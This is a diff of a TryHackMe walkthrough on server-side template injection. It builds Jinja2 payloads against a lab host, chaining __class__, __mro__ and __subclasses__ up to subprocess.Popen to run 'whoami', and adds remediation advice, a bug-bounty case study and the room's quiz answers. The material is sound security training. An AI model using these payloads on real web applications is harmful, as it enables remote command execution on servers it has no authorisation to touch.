@@ -1,7 +1,7 @@
 <p align="center">May 2, 2025<br>
 Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
 It´s part of my $$\textcolor{#FF69B4}{\textbf{361}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
-<img width="300px" src="" alt="Your Image Badge"><br>
+<img width="300px" src="https://github.com/user-attachments/assets/f73b5a99-8e07-4662-9a98-4a123d8eeb40" alt="Your Image Badge"><br>
 <img width="200px" src="https://github.com/user-attachments/assets/1acd3213-b0f0-4ec2-a142-8e36ab0df272"><br></p>
 
 <h1 align="center">$$\textcolor{#3bd62d}{\textnormal{SSTI}}$$</h1>
@@ -10,7 +10,8 @@ It is classified a medium-level walkthrough.<br>
 You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
 Can be accessed clicking  <a href="https://tryhackme.com/room/learnssti">here</a>.</p>
 
-<p align="center"> <img width="900px" src=""> </p>
+<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/cf88c38c-9822-4232-83e9-d0631e6ea002"> </p>
+
 
 <br>
 
@@ -259,3 +260,223 @@ In the case of our example, the documentation states the following:<br>
 Since Jinja2 is a Python based template engine, we will look at ways to run shell commands in Python. A quick Google search brings up a blog that details different ways to run shell commands. I will highlight a few of them below:</p>
 
 
+![image](https://github.com/user-attachments/assets/b49e54aa-7dc2-4b9d-8f80-ed8b58310612)
+
+<h3>Crafting a proof of concept (Generic)</h3>
+<p>Combining all of this knowledge, we are able to build a proof of concept (POC).</p>
+
+<p>The following payload takes the syntax we acquired from Task 4, and the shells above, and merges them into something that the template engine will accept: <code>>http://10.10.211.207:5000/profile/{% import os %}{{ os.system("whoami") }}</code>.<br><br>
+
+Note: Jinja2 is essentially a sub language of Python that doesn't integrate the import statement, which is why the above does not work.</p>
+
+<h3>Crafting a proof of concept (Jinja2)</h3>
+<p>Python allows us to call the current class instance with .__class__, we can call this on an empty string:<br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__ }}</code>.</p>
+
+<p>Classes in Python have an attribute called .__mro__ that allows us to climb up the inherited object tree:<br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__.__mro__ }}</code>.</p>
+
+<p>Since we want the root object, we can access the second property (first index):<br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__.__mro__[1] }}</code>.</p>
+
+<p>Objects in Python have a method called .__subclassess__ that allows us to climb down the object tree:<br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}</code>.</p>
+
+<p>Now we need to find an object that allows us to run shell commands. Doing a Ctrl-F for the modules in the code above yields us a match:</p>
+
+![image](https://github.com/user-attachments/assets/179680fc-9e8e-4421-848e-a055bf864711)
+
+<p>As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.<br><br>
+
+In this example, the position in the list is 400 (index 401):<br><br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}</code>.<br><br>
+
+The above payload essentially calls the subprocess.Popen method, now all we have to do is invoke it (use the code above for the syntax)<br><br>
+
+Payload: <code>http://10.10.211.207:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}</code>.</p>
+
+<h3>Finding payloads</h3>
+<p>The process to build a payload takes a little while when doing it for the first time, however it is important to understand why it works.<br><br>
+
+For quick reference, an amazing GitHub repo has been created as a cheatsheet for payloads for all web vulnerabilities, including SSTI.<br><br>
+
+The repo is located here, while the document for SSTI is located here.</p>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
+
+<br>
+
+> 5.1. <em>What is the result of the "whoami" shell command?</em> Hint : <em>The whole output shows a tuple, not just the result.</em><br><a id='5.1'></a>
+>> <strong><code>jake</code></strong><br>
+<p></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/42aa234d-1e0c-4327-99df-ef5f7f0f856b)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/39773f37-d228-4d2b-b304-32f3d1526f4b)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4c939756-17c7-4c07-b1cd-8cc4a480fec3)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/af6bf56c-fbbf-4860-b8f2-42ac40ba3663)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/0c4f3a1a-0951-48d6-a87e-8aa9c13cb554)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/35dfdd0c-09fd-437c-b685-952c0e2791fe)
+
+<br>
+<br>
+
+
+<h2>Task 6 . Examination</h2>
+<p>Now that we've exploited the application, let's see what was actually happening when the payload was injected.<br><br>
+
+The code that we exploited was the same as shown in Task 1:</p>
+
+![image](https://github.com/user-attachments/assets/2779291f-4dac-438d-bf95-1b28073385a2)
+
+
+<p>Let's imagine this like a simple find and replace.<br><br>
+
+Refer to the code below to see exactly how this works:</p>
+
+![image](https://github.com/user-attachments/assets/45d07124-8e07-4f27-8b49-2084d5f1cf5d)
+
+<p>As we learned in Task 4, Jinja2 is going to evaluate code that is in-between those sets of characters, which is why the exploit worked.</p>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
+
+<br>
+
+> 6.1. <em>Understand all of the above.</em><br><a id='6.1'></a>
+>> <strong><code>No answer needed</code></strong><br>
+<p></p>
+
+<br>
+<br>
+
+
+<h2>Task 7 . Remediation</h2>
+<p>All this hacking begs the question, what can be done to prevent this from happening in the first place?</p>
+
+<h3>Secure Methods</h3>
+<p>Most template engines will have a feature that allows you to pass input in as data, rather that concatenating input into the template.<br><br>
+
+In Jinja2, this can be done by using the second argument:</p>
+
+![image](https://github.com/user-attachments/assets/509251b0-b13c-46dd-9111-8dced845180f)
+
+<h3>Sanitisation</h3>
+<p>User input can not be trusted!<br><br>
+
+Every place in your application where a user is allowed to add custom content, make sure the input is sanitised!<br><br>
+
+This can be done by first planning what character set you want to allow, and adding these to a whitelist.<br><br>
+
+In Python, this can be done like so:</p>
+
+![image](https://github.com/user-attachments/assets/5bf18d6f-465e-4ea6-a4e2-7259cfbe6641)
+
+<p>Most importantly, remember to read the documentation of the template engine you are using.</p>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
+
+<br>
+
+> 7.1. <em>Understand all of the above.</em><br><a id='7.1'></a>
+>> <strong><code>No answer needed</code></strong><br>
+<p></p>
+
+<br>
+<br>
+
+
+<h2>Task 8 . Case Study</h2>
+
+<h3>HackerOne Bug Bounty</h3>
+<p>In March 2016, a user reported an SSTI vulnerability in one of Uber's subdomains.<br><br>
+
+The vulnerability was present within a form that allowed the user to change their profile name. Much like in the example, the user had control over an input which was then reflected back to the user (via email).<br><br>
+
+Although the user was unable to gain remote code execution, the vulnerability was still present and they were awarded with a $10,000 bounty!<br><br>
+
+Read the report <a href="https://hackerone.com/reports/125980">here</a>.</p>
+
+<br>
+
+> 8.1. <em>What payload was used to confirm SSTI?</em><br><a id='8.1'></a>
+>> <strong><code>{{ '7'*7 }}</code></strong><br>
+<p></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/47bf9b18-8e08-462b-a7b4-1206c2d1c95b)
+
+<br>
+<br>
+
+
+<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
+<br>
+<p align="center">
+<img width="1000px" src="https://github.com/user-attachments/assets/e9418685-bf3f-4e96-8f3c-8a206c121a01"><br>
+<img width="1000px" src="https://github.com/user-attachments/assets/61a5414c-3310-4437-8913-0c61632425f7"></p>
+
+<br>
+
+<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
+<br>
+
+
+<div align="center">
+
+|       Date        |   Streak |   All Time   |   All Time   |   Monthly   |   Monthly  |  Points  |   Rooms   |   Badges  |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+|    May 2, 2025    |    361   |     240ᵗʰ    |      6ᵗʰ     |     665ᵗʰ   |     7ᵗʰ    |  99,223  |    703    |     60    |
+
+</div>
+
+<br>
+
+
+<p align="center"> Global All Time: 240ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/fee13429-8a89-4ba8-8457-951bc0829233"> </p>
+
+<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/d2c176c3-6687-4ca2-89a0-2253af79e6a1"> </p>
+
+<p align="center"> Global monthly:  665ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/7c0cc720-5b7a-4175-a0b9-71d76cace6d67"> </p>
+
+<p align="center"> Brazil monthly:    7ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/9453e18e-998e-4cb5-8300-4e97cfe8d9c7"> </p>
+
+
+<br>
+<br>
+
+<p align="center"> Weekly League:    13ʳᵈ Platinum<br><br><img width="1000px" src="https://github.com/user-attachments/assets/e51a11ce-b7f6-47d5-a534-0b03884b9bd3"> </p>
+
+<br>
+<br>
+
+<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>
+
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
+
+<br>
+
+<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
+<p align="center"><a href="https://tryhackme.com/p/jakeyee">jakeyee</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p>
